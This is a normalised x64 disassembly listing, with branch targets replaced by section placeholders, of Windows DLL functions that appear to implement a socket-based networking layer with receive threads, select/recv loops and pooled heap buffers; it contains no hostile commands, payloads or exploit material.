mov [ rbp + 0x38 ] r12
mov [ rbp + 0x30 ] r12
cmp [ rcx + 0x88 ] r12d
je r-xdata
lea rcx [ rbp + 0x30 ]
mov edx 0xfa0
call sub_18001e3a0
cmp [ rbp + 0x30 ] r12
jne r-xdata
mov r9 [ rcx + 0xf0 ]
test r9 r9
je r-xdata
mov rcx rsi
mov [ rsp + 0x48 ] rdi
call sub_18001f130
mov edi eax
cmp eax 0x400
je r-xdata
mov eax 0xabcd0003
mov r12 [ rsp + 0x40 ]
add rsp 0x50
pop rsi
pop rbx
pop rbp
retn
xor eax eax
mov r12 [ rsp + 0x40 ]
add rsp 0x50
pop rsi
pop rbx
pop rbp
retn
mov [ rcx + 0xc ] r12d
mov rax [ rcx ]
mov r8d [ rdx + 0x18 ]
mov rdx [ rdx + 0x4 ]
mov [ rbp - 0x30 ] rax
mov rax [ rcx + 0x8 ]
mov [ rbp - 0x28 ] rax
mov rax [ rcx + 0x10 ]
mov [ rbp - 0x20 ] rax
mov rax [ rcx + 0x18 ]
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x18 ] rax
call r9
mov r11 [ rsi + 0x4 ]
mov [ rsi + 0x10 ] r11
mov [ rsi + 0x18 ] r12d
mov rcx [ rbp + 0x30 ]
call sub_18001e550
mov r12 [ rsp + 0x40 ]
mov eax edi
mov rdi [ rsp + 0x48 ]
add rsp 0x50
pop rsi
pop rbx
pop rbp
retn
nop [ rax ] eax
cmp edi 0x404
je r-xdata
mov rdi [ rsi + 0x10 ]
mov ecx [ rdi + 0x4 ]
bt ecx 0x1c
jb r-xdata
mov rcx rsi
call sub_18001f1e0
mov edi eax
cmp eax 0x400
jne r-xdata
call sub_18001ed70
test eax eax
je r-xdata
cmp edi 0x401
je r-xdata
cmp [ rbx + 0xf0 ] r12
je r-xdata
mov rdx [ rsi + 0x10 ]
mov rcx [ rbx + 0xb8 ]
call sub_18001f270
cmp eax 0x406
jne r-xdata
mov r9 [ rbp + 0x30 ]
xor eax eax
lea r8 [ rbp + 0x20 ]
lea rdx [ rbp + 0x38 ]
mov rcx rsi
mov [ rbp - 0x30 ] r12
mov [ rbp - 0x28 ] rax
mov [ rbp - 0x20 ] rax
mov [ rbp - 0x18 ] rax
call sub_18001efe0
mov r8d [ rbp + 0x20 ]
mov rdx [ rbp + 0x38 ]
mov [ rbx + 0xc ] eax
mov rax [ rbx ]
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x30 ] rax
mov rax [ rbx + 0x8 ]
mov [ rbp - 0x28 ] rax
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x20 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x18 ] rax
call [ rbx + 0xf0 ]
mov rcx [ rbp + 0x30 ]
cmp eax 0x405
je r-xdata
mov rdx [ rbx + 0xb8 ]
mov r8 rdi
mov rcx rbx
call sub_18001d680
jmp r-xdata
mov rcx [ rbx + 0xb8 ]
jmp r-xdata
call sub_18001e7b0
sub_18001db20
push rbp
push rdi
lea rbp [ rsp - 0x398 ]
sub rsp 0x498
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x380 ] rax
mov rdi rcx
test rcx rcx
jne r-xdata
mov [ rsp + 0x4b8 ] rbx
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x4c8 ] r12
xor r12d r12d
mov edx 0xfa0
mov [ rsp + 0x30 ] r12
call sub_18001e3a0
mov ebx eax
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
lea rcx [ rsp + 0x68 ]
xor edx edx
mov r8d 0x200
mov [ rsp + 0x4c0 ] rsi
mov [ rsp + 0x60 ] r12
mov [ rsp + 0x490 ] r13
call sub_18000bd10
mov rdx [ rdi + 0xa0 ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x38 ] r12
call sub_18001d2a0
mov [ rsp + 0x38 ] 0xf
call [ GetTickCount@IAT ]
mov rcx [ rsp + 0x30 ]
mov [ rdi + 0x90 ] eax
mov rax [ rcx + 0x4 ]
mov [ rcx + 0x10 ] rax
mov rax [ rsp + 0x30 ]
mov [ rax + 0x18 ] r12d
cmp [ rdi + 0x78 ] r12d
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov rcx [ rbp + 0x380 ]
xor rcx rsp
call sub_18000c060
add rsp 0x498
pop rdi
pop rbp
retn
mov rcx [ rsp + 0x30 ]
cmovne ebx r12d
call sub_18001e550
mov rcx rdi
call sub_18001d5e0
cmp [ rdi + 0x100 ] r12
je r-xdata
nop [ rax + rax ] eax
mov rbx [ rsp + 0x4b8 ]
mov r12 [ rsp + 0x4c8 ]
lea rcx [ rdi + 0xc0 ]
call [ EnterCriticalSection@IAT ]
mov ebx [ rdi + 0x10 ]
mov r12d [ rdi + 0x14 ]
mov r13 [ rdi + 0x18 ]
xor edx edx
mov rcx rdi
lea r8d [ rdx + 0x20 ]
call sub_18001d220
mov [ rdi + 0x10 ] ebx
test r12d r12d
je r-xdata
mov rax [ rdi ]
mov rcx [ rdi + 0xb0 ]
or edx 0xffffffff
mov [ rsp + 0x40 ] rax
mov rax [ rdi + 0x8 ]
mov [ rsp + 0x48 ] rax
mov rax [ rdi + 0x10 ]
mov [ rsp + 0x50 ] rax
mov rax [ rdi + 0x18 ]
mov [ rsp + 0x58 ] rax
call [ WaitForSingleObject@IAT ]
lea rcx [ rsp + 0x40 ]
mov edx ebx
call [ rdi + 0x100 ]
mov rax [ rsp + 0x30 ]
mov rcx [ rdi + 0xa0 ]
xor r9d r9d
mov edx [ rax + 0x18 ]
mov r8d [ rax + 0xc ]
sub r8d edx
add rdx [ rax + 0x4 ]
call [ recv@IAT ]
test eax eax
jle r-xdata
cmp [ rdi + 0x88 ] r12d
je r-xdata
lea rcx [ rdi + 0xc0 ]
call [ LeaveCriticalSection@IAT ]
mov r13 [ rsp + 0x490 ]
mov rsi [ rsp + 0x4c0 ]
xor eax eax
mov [ rdi + 0x14 ] r12d
mov [ rdi + 0x18 ] r13
call [ WSAGetLastError@IAT ]
mov r8 [ rdi + 0xf8 ]
mov ebx eax
test r8 r8
je r-xdata
mov rcx [ rsp + 0x30 ]
add [ rcx + 0x18 ] eax
mov rdx [ rsp + 0x30 ]
mov ecx [ rdx + 0x18 ]
mov eax [ rdx + 0xc ]
sub eax ecx
je r-xdata
call [ GetTickCount@IAT ]
mov ecx [ rdi + 0x90 ]
sub eax ecx
cmp eax [ rdi + 0x98 ]
jae r-xdata
test esi esi
jne r-xdata
cmp [ rdi + 0x78 ] r12d
test eax eax
je r-xdata
mov rcx rdi
call sub_18001d920
mov ebx eax
call [ GetTickCount@IAT ]
mov [ rdi + 0x90 ] eax
add rcx [ rdx + 0x4 ]
mov r8d eax
xor edx edx
call sub_18001d220
mov rdx [ rsp + 0x30 ]
mov rcx rdi
call sub_18001d780
jmp r-xdata
jmp r-xdata
mov rax [ rdi ]
lea rcx [ rsp + 0x40 ]
mov edx ebx
mov [ rsp + 0x40 ] rax
mov rax [ rdi + 0x8 ]
mov [ rsp + 0x48 ] rax
mov rax [ rdi + 0x10 ]
mov [ rsp + 0x50 ] rax
mov rax [ rdi + 0x18 ]
mov [ rsp + 0x58 ] rax
call r8
lea rcx [ rbp + 0x170 ]
lea rdx [ rsp + 0x60 ]
mov r8d 0x208
call sub_18000c440
lea r11 [ rsp + 0x38 ]
lea rdx [ rbp + 0x170 ]
xor r9d r9d
xor r8d r8d
xor ecx ecx
mov [ rsp + 0x20 ] r11
call [ select@IAT ]
mov esi eax
call [ WSAGetLastError@IAT ]
mov ebx eax
cmp esi 0x1
jge r-xdata
jmp r-xdata
cmp [ rdi + 0x78 ] r12d
je r-xdata
sub_18001de20
push rbp
push rbx
lea rbp [ rsp - 0x4f ]
sub rsp 0x88
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x3f ] rax
mov rbx rcx
test rcx rcx
jne r-xdata
cmp [ rcx ] 0x0
je r-xdata
mov eax 0xabcd0000
jmp r-xdata
mov edx 0x1
mov [ rsp + 0xa8 ] rsi
mov [ rsp + 0x80 ] r13
mov r13d 0x2
lea r8d [ rdx + 0x5 ]
mov ecx r13d
call [ socket@IAT ]
mov rsi rax
cmp rax 0xffffffffffffffff
jne r-xdata
mov eax 0xabcd000d
jmp r-xdata
mov rcx [ rbp + 0x3f ]
xor rcx rsp
call sub_18000c060
add rsp 0x88
pop rbx
pop rbp
retn
xor eax eax
mov [ rsp + 0xb0 ] rdi
mov [ rsp + 0xb8 ] r12
xor r12d r12d
mov [ rbp + 0x11 ] rax
mov [ rbp + 0x19 ] eax
mov [ rbp + 0x1d ] ax
mov [ rbp + 0xf ] r12w
cmp [ rbx + 0x84 ] eax
je r-xdata
call [ WSAGetLastError@IAT ]
jmp r-xdata
xor eax eax
mov [ rbp - 0x1 ] r13w
mov [ rbp + 0x1 ] rax
mov [ rbp + 0x9 ] eax
mov [ rbp + 0xd ] ax
cmp [ rbx + 0x7c ] eax
je r-xdata
movzx ecx [ rbx + 0xa ]
mov [ rbp + 0xf ] r13w
mov [ rbp + 0x13 ] r12d
call [ htons@IAT ]
mov [ rbp + 0x11 ] ax
mov rsi [ rsp + 0xa8 ]
mov r13 [ rsp + 0x80 ]
movzx ecx [ rbx + 0x8 ]
call [ htons@IAT ]
mov [ rbp + 0x1 ] ax
mov eax [ rbx + 0x4 ]
movzx ecx [ rbx + 0x28 ]
call [ htons@IAT ]
mov [ rbp + 0x1 ] ax
mov eax [ rbx + 0x24 ]
jmp r-xdata
mov r9d 0xa
lea rdx [ rbp - 0x1 ]
mov rcx rsi
lea r8d [ r9 + 0x6 ]
call sub_18001d810
mov edi eax
test eax eax
jne r-xdata
lea rdx [ rbp + 0xf ]
mov r8d 0x10
mov rcx rsi
call [ bind@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov [ rbp + 0x3 ] eax
cmp [ rbx + 0xa ] r12w
je r-xdata
mov edx r13d
mov rcx rsi
call [ shutdown@IAT ]
mov rcx rsi
call [ closesocket@IAT ]
mov [ rbx ] r12d
mov [ rbx + 0x78 ] 0x1
mov [ rbx + 0xa0 ] 0xffffffffffffffff
mov [ rbx + 0xa0 ] rsi
cmp [ rbx + 0x7c ] r12d
je r-xdata
call [ WSAGetLastError@IAT ]
jmp r-xdata
xor eax eax
lea r8 [ rbp - 0x9 ]
lea rdx [ rbp + 0x1f ]
mov rcx rsi
mov [ rbp + 0x1f ] r12w
mov [ rbp - 0x9 ] 0x10
mov [ rbp + 0x21 ] rax
mov [ rbp + 0x29 ] eax
mov [ rbp + 0x2d ] ax
call [ getsockname@IAT ]
test eax eax
je r-xdata
mov ecx [ rbx + 0x20 ]
dec ecx
je r-xdata
mov edi eax
test eax eax
je r-xdata
movzx ecx [ rbp + 0x21 ]
call [ ntohs@IAT ]
mov rcx rsi
mov [ rbx + 0xa ] ax
call sub_18001d3b0
mov edi eax
test eax eax
jne r-xdata
call [ WSAGetLastError@IAT ]
jmp r-xdata
mov rcx rbx
call sub_18001f9c0
cmp ecx r13d
je r-xdata
mov rdx [ rbx + 0xe8 ]
test rdx rdx
je r-xdata
jmp r-xdata
mov rcx [ rbx + 0xa8 ]
test rcx rcx
je r-xdata
mov rcx rbx
call sub_18001f6e0
jmp r-xdata
or edi 0xffffffff
mov r12 [ rsp + 0xb8 ]
mov eax edi
mov rdi [ rsp + 0xb0 ]
mov rax [ rbx ]
lea rcx [ rbp + 0x1f ]
mov [ rbp + 0x1f ] rax
mov rax [ rbx + 0x8 ]
mov [ rbp + 0x27 ] rax
mov rax [ rbx + 0x10 ]
mov [ rbp + 0x2f ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp + 0x37 ] rax
call rdx
jmp r-xdata
lea r8 [ sub_18001db20 ]
mov r9 rbx
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] r12
mov [ rsp + 0x20 ] r12d
call [ CreateThread@IAT ]
mov [ rbx + 0xa8 ] rax
test rax rax
jne r-xdata
call [ CloseHandle@IAT ]
mov edi eax
test eax eax
jne r-xdata
mov rcx [ rbx + 0xb0 ]
mov edi r12d
mov [ rbx + 0x78 ] r12d
mov [ rbx ] 0x1
call [ ResetEvent@IAT ]
call [ GetLastError@IAT ]
sub_18001e100
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov [ rsp + 0x20 ] rbx
lea rbx [ rw-data ]
xor edx edx
mov rcx rbx
mov r8d 0x14c
call sub_18001d220
lea rcx [ rw-data ]
call [ InitializeCriticalSection@IAT ]
mov [ rw-data ] rbx
mov [ rw-data ] rbx
mov rbx [ rsp + 0x20 ]
mov [ rw-data ] 0x1
mov [ rw-data ] 0x64
sub_18001e170
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rsi rdx
mov ebx ecx
test rdx rdx
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax 0xabcd0000
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
lea rcx [ rw-data ]
mov [ rsp + 0x30 ] rdi
mov edi 0xabcd0005
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xabcd0001
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov rbx [ rsp + 0x38 ]
mov eax edi
mov rdi [ rsp + 0x30 ]
add rsp 0x20
pop rsi
retn
mov rax [ rw-data ]
lea rcx [ rw-data ]
cmp rcx rax
je r-xdata
cmp ebx [ rax + 0x10 ]
je r-xdata
mov [ rsi ] rax
xor edi edi
mov rax [ rax + 0x110 ]
cmp rcx rax
jne r-xdata
jmp r-xdata
sub_18001e220
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
lea rcx [ rw-data ]
mov [ rsp + 0x20 ] rdi
mov edi 0xabcd0005
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xabcd0001
add rsp 0x28
retn
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax edi
mov rdi [ rsp + 0x20 ]
add rsp 0x28
retn
mov [ rsp + 0x30 ] rbx
mov rbx [ rw-data ]
lea rax [ rw-data ]
cmp rax rbx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rcx [ rbx + 0x108 ]
mov rax [ rbx + 0x110 ]
mov [ rcx + 0x110 ] rax
mov rax [ rbx + 0x110 ]
mov [ rax + 0x108 ] rcx
dec [ rw-data ]
mov rcx [ rbx + 0xa8 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0xb0 ]
test rcx rcx
je r-xdata
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0xa8 ]
call [ CloseHandle@IAT ]
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
xor edi edi
mov edx 0xabcd0004
test eax eax
cmove edi edx
call [ CloseHandle@IAT ]
sub_18001e310
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
add rsp 0x28
retn
mov [ rsp + 0x20 ] rbx
lea rbx [ rw-data ]
xor edx edx
mov rcx rbx
mov r8d 0xbc
call sub_18001d220
lea rax [ rw-data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
mov [ rw-data ] rax
lea rax [ rw-data ]
mov [ rw-data ] 0x1
mov [ rw-data ] rbx
mov [ rw-data ] rbx
mov [ rw-data ] rax
mov [ rw-data ] rax
call [ InitializeCriticalSection@IAT ]
mov rbx [ rsp + 0x20 ]
mov [ rw-data ] 0x1
sub_18001e3a0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov edi edx
mov rbx rcx
test rcx rcx
je r-xdata
mov eax 0xabcd0000
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea eax [ rdx - 0x1 ]
cmp eax 0x3fbff
ja r-xdata
mov [ rcx ] 0x0
lea rcx [ rw-data ]
mov [ rsp + 0x30 ] rsi
mov esi 0xabcd0003
call [ EnterCriticalSection@IAT ]
cmp edi 0xfa0
ja r-xdata
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
jbe r-xdata
call [ GetProcessHeap@IAT ]
mov edx 0x8
mov r8d 0x3fc49
mov rcx rax
call [ HeapAlloc@IAT ]
mov [ rbx ] rax
test rax rax
je r-xdata
mov rax [ rw-data ]
mov [ rbx ] rax
mov rax [ rw-data ]
mov rcx [ rax + 0x1c ]
mov [ rw-data ] rcx
mov rax [ rbx ]
mov rcx [ rax + 0x1c ]
lea rax [ rw-data ]
mov [ rcx + 0x24 ] rax
dec [ rw-data ]
jmp r-xdata
call [ GetProcessHeap@IAT ]
mov edx 0x8
mov r8d 0xfe9
mov rcx rax
call [ HeapAlloc@IAT ]
mov [ rbx ] rax
test rax rax
je r-xdata
mov rax [ rw-data ]
mov [ rbx ] rax
mov rax [ rw-data ]
mov rcx [ rax + 0x1c ]
mov [ rw-data ] rcx
mov rax [ rbx ]
mov rcx [ rax + 0x1c ]
lea rax [ rw-data ]
mov [ rcx + 0x24 ] rax
dec [ rw-data ]
jmp r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax esi
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
inc [ rw-data ]
mov rax [ rbx ]
mov [ rax ] 0x1
inc [ rw-data ]
jmp r-xdata
mov rcx [ rw-data ]
mov rax [ rbx ]
xor esi esi
mov [ rcx + 0x1c ] rax
mov rax [ rbx ]
mov [ rax + 0x24 ] rcx
mov rax [ rbx ]
lea rcx [ rw-data ]
mov [ rax + 0x1c ] rcx
mov rax [ rbx ]
mov [ rw-data ] rax
mov r8 [ rbx ]
lea rdx [ r8 + 0x2c ]
mov [ r8 + 0x4 ] rdx
mov rdx [ rbx ]
lea r8d [ rdi + 0x1c ]
mov [ rdx + 0xc ] r8d
mov r8 [ rbx ]
mov rdx [ r8 + 0x4 ]
mov [ r8 + 0x10 ] rdx
sub_18001e550
push rdi
sub rsp 0x20
mov rdi rcx
test rcx rcx
jne r-xdata
lea rcx [ rw-data ]
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov esi 0xabcd0006
call [ EnterCriticalSection@IAT ]
mov rbx [ rw-data ]
lea rax [ rw-data ]
cmp rbx rax
je r-xdata
mov eax 0xabcd0000
add rsp 0x20
pop rdi
retn
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov rbx [ rsp + 0x30 ]
mov eax esi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp rdi rbx
je r-xdata
cmp rbx rax
je r-xdata
mov rbx [ rbx + 0x1c ]
cmp rbx rax
jne r-xdata
mov rax [ rbx + 0x1c ]
mov rcx [ rbx + 0x24 ]
mov [ rcx + 0x1c ] rax
mov rax [ rbx + 0x1c ]
mov [ rax + 0x24 ] rcx
cmp [ rbx ] 0x0
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x4
jae r-xdata
cmp [ rw-data ] 0x10
jae r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
dec [ rw-data ]
test eax eax
jne r-xdata
xor edx edx
mov r8d 0x3fc49
mov rcx rbx
call sub_18001d220
mov r11 [ rw-data ]
lea rax [ rw-data ]
mov [ r11 + 0x1c ] rbx
mov [ rbx + 0x24 ] r11
mov [ rbx + 0x1c ] rax
inc [ rw-data ]
mov [ rw-data ] rbx
jmp r-xdata
xor edx edx
mov r8d 0xfe9
mov rcx rbx
call sub_18001d220
mov r11 [ rw-data ]
lea rax [ rw-data ]
mov [ r11 + 0x1c ] rbx
mov [ rbx + 0x24 ] r11
mov [ rbx + 0x1c ] rax
inc [ rw-data ]
mov [ rw-data ] rbx
xor esi esi
mov esi 0xabcd0004
jmp r-xdata
sub_18001e6a0
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
add rsp 0x28
retn
mov [ rsp + 0x30 ] rbx
lea rcx [ rw-data ]
mov [ rsp + 0x38 ] rsi
mov [ rsp + 0x20 ] rdi
call [ EnterCriticalSection@IAT ]
mov rdi [ rw-data ]
lea rsi [ rw-data ]
cmp rdi rsi
je r-xdata
mov rdi [ rw-data ]
lea rsi [ rw-data ]
mov [ rw-data ] 0x0
cmp rdi rsi
je r-xdata
mov rbx rdi
mov rdi [ rdi + 0x1c ]
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
cmp rdi rsi
jne r-xdata
mov rdi [ rw-data ]
lea rsi [ rw-data ]
mov [ rw-data ] 0x0
cmp rdi rsi
je r-xdata
nop [ rax ] eax
lea rcx [ rw-data ]
mov [ rw-data ] 0x0
call [ LeaveCriticalSection@IAT ]
mov rdi [ rsp + 0x20 ]
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
nop [ rax ] eax
mov rbx rdi
mov rdi [ rdi + 0x1c ]
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
cmp rdi rsi
jne r-xdata
mov rbx rdi
mov rdi [ rdi + 0x1c ]
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
cmp rdi rsi
jne r-xdata
sub_18001e7b0
test rcx rcx
je r-xdata
retn
push rdi
sub rsp 0x20
cmp [ rcx ] 0x0
mov [ rsp + 0x30 ] rbx
mov eax 0x3fc1c
mov rdi rcx
mov rcx [ rcx + 0x4 ]
mov ebx 0xfbc
cmovne ebx eax
xor r8d r8d
mov edx ebx
call sub_18001d220
mov r11 [ rdi + 0x4 ]
mov [ rdi + 0xc ] ebx
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x10 ] r11
mov [ rdi + 0x18 ] 0x0
add rsp 0x20
pop rdi
sub_18001e800
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
add rsp 0x28
retn
lea rcx [ rw-data ]
call [ EnterCriticalSection@IAT ]
call sub_18001e220
xor r11d r11d
lea rcx [ rw-data ]
mov [ rw-data ] r11
call [ LeaveCriticalSection@IAT ]
lea rcx [ rw-data ]
call [ DeleteCriticalSection@IAT ]
sub_18001e850
push rdi
sub rsp 0x20
mov rdi rcx
test rcx rcx
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax 0xabcd0000
add rsp 0x20
pop rdi
retn
lea rcx [ rw-data ]
mov [ rsp + 0x38 ] rbx
xor ebx ebx
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] 0x3e8
jb r-xdata
mov eax 0xabcd0001
add rsp 0x20
pop rdi
retn
call [ GetProcessHeap@IAT ]
mov edx 0x8
mov r8d 0x118
mov rcx rax
call [ HeapAlloc@IAT ]
mov [ rdi ] rax
test rax rax
je r-xdata
mov ebx 0xabcd0002
jmp r-xdata
mov ebx 0xabcd0003
jmp r-xdata
lea rcx [ rsp + 0x30 ]
mov edx 0x3fc00
mov [ rsp + 0x30 ] rbx
call sub_18001e3a0
mov r11 [ rsp + 0x30 ]
test r11 r11
jne r-xdata
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax ebx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rdi ]
mov rcx [ rw-data ]
mov [ rcx + 0x110 ] rax
mov rax [ rdi ]
mov [ rax + 0x108 ] rcx
mov rax [ rdi ]
lea rcx [ rw-data ]
mov [ rax + 0x110 ] rcx
mov rax [ rdi ]
mov [ rw-data ] rax
mov rcx [ rdi ]
mov eax [ rw-data ]
mov [ rcx + 0x10 ] eax
inc [ rw-data ]
mov rax [ rdi ]
mov [ rax + 0x74 ] 0x1
mov rax [ rdi ]
mov [ rax + 0x78 ] ebx
mov rax [ rdi ]
mov [ rax + 0xb8 ] r11
mov rcx [ rdi ]
add rcx 0xc0
call [ InitializeCriticalSection@IAT ]
mov edx 0x1
xor r9d r9d
mov r8d edx
xor ecx ecx
call [ CreateEventA@IAT ]
mov rdx [ rdi ]
mov [ rdx + 0xb0 ] rax
mov rdx [ rdi ]
mov [ rdx + 0x94 ] 0xf
mov rdx [ rdi ]
mov [ rdx + 0x98 ] 0xea60
mov rdx [ rdi ]
mov [ rdx + 0x9c ] ebx
inc [ rw-data ]
call [ GetProcessHeap@IAT ]
mov r8 [ rdi ]
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
mov [ rdi ] rbx
sub_18001e9e0
push rdi
sub rsp 0x20
mov rdi rcx
test rcx rcx
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax 0xabcd0000
add rsp 0x20
pop rdi
retn
mov rcx [ rcx + 0xa8 ]
mov [ rsp + 0x38 ] rsi
test rcx rcx
je r-xdata
mov eax 0xabcd0001
add rsp 0x20
pop rdi
retn
mov rcx [ rdi + 0xb0 ]
test rcx rcx
je r-xdata
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rdi + 0xa8 ]
call [ CloseHandle@IAT ]
mov [ rdi + 0xa8 ] 0x0
lea rcx [ rw-data ]
mov esi 0xabcd0005
call [ EnterCriticalSection@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
call [ CloseHandle@IAT ]
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax esi
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov [ rsp + 0x30 ] rbx
mov rbx [ rw-data ]
lea rax [ rw-data ]
cmp rax rbx
je r-xdata
mov rbx [ rsp + 0x30 ]
nop [ rax ] eax
mov rcx [ rbx + 0x108 ]
mov rax [ rbx + 0x110 ]
mov [ rcx + 0x110 ] rax
mov rax [ rbx + 0x110 ]
mov [ rax + 0x108 ] rcx
mov rcx [ rbx + 0xb8 ]
call sub_18001e550
lea rcx [ rbx + 0xc0 ]
mov [ rbx + 0xb8 ] 0x0
call [ DeleteCriticalSection@IAT ]
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov rcx rax
xor edx edx
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
mov rbx [ rbx + 0x110 ]
cmp rax rbx
jne r-xdata
dec [ rw-data ]
xor esi esi
mov esi 0xabcd0004
jmp r-xdata
cmp rdi rbx
je r-xdata
jmp r-xdata
sub_18001eb30
sub rsp 0x28
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
add rsp 0x28
retn
lea rcx [ rw-data ]
call [ EnterCriticalSection@IAT ]
call sub_18001e6a0
xor r11d r11d
lea rcx [ rw-data ]
lea r8d [ r11 + 0x2c ]
xor edx edx
mov [ rw-data ] r11
mov [ rw-data ] r11d
call sub_18001d220
xor edx edx
lea rcx [ rw-data ]
lea r8d [ rdx + 0x2c ]
call sub_18001d220
xor edx edx
lea rcx [ rw-data ]
lea r8d [ rdx + 0x2c ]
call sub_18001d220
lea rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
lea rcx [ rw-data ]
call [ DeleteCriticalSection@IAT ]
sub_18001ebc0
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov rbp rdx
mov rsi rcx
test rcx rcx
je r-xdata
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov eax 0xabcd0000
add rsp 0x20
pop rdi
retn
test rdx rdx
je r-xdata
test r8 r8
je r-xdata
cmp [ rcx ] 0x0
je r-xdata
cmp [ r8 ] 0x0
je r-xdata
mov ecx [ rdx + 0x4 ]
mov [ rsp + 0x38 ] rbx
mov ebx 0xabcd000a
mov eax ecx
and eax 0xf
test al al
jne r-xdata
mov eax ecx
and eax 0x2
cmp al 0x2
je r-xdata
mov r8d [ rsi + 0x18 ]
mov rdx [ rsi + 0x4 ]
mov rcx [ rdi + 0x4 ]
call sub_18001d240
mov r11d [ rsi + 0x18 ]
mov [ rdi + 0x18 ] r11d
mov eax ebx
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
and ecx 0x1
cmp cl 0x1
jne r-xdata
mov edx [ rdi + 0x18 ]
mov rcx [ rdi + 0x4 ]
call sub_180001040
xor ecx ecx
cmp rax [ rbp + 0xc ]
cmove ebx ecx
mov ecx [ rdx + 0x18 ]
cmp ecx [ r8 + 0xc ]
jbe r-xdata
mov eax [ rsi + 0x18 ]
lea r9 [ r8 + 0x18 ]
mov r8 [ r8 + 0x4 ]
mov [ r9 ] ecx
mov rcx [ rsi + 0x4 ]
lea rdx [ rsp + 0x30 ]
mov [ rsp + 0x30 ] eax
call sub_180001100
test eax eax
je r-xdata
mov ebx 0xabcd000c
jmp r-xdata
mov ebx 0xabcd0011
jmp r-xdata
sub_18001ecd0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov edi r8d
mov r10 rdx
mov rbx rcx
test rcx rcx
je r-xdata
mov eax 0xabcd0000
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
test rdx rdx
je r-xdata
lea eax [ r8 - 0xfa1 ]
cmp eax 0x3ec5f
ja r-xdata
cmp [ rcx ] 0x0
je r-xdata
mov r8 [ rcx + 0x4 ]
test r8 r8
je r-xdata
lea r9 [ rcx + 0x18 ]
mov [ rcx + 0x18 ] 0x3fc00
mov edx edi
mov rcx r10
mov [ rsp + 0x30 ] rsi
call sub_1800010a0
test eax eax
jne r-xdata
mov eax 0xabcd0010
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
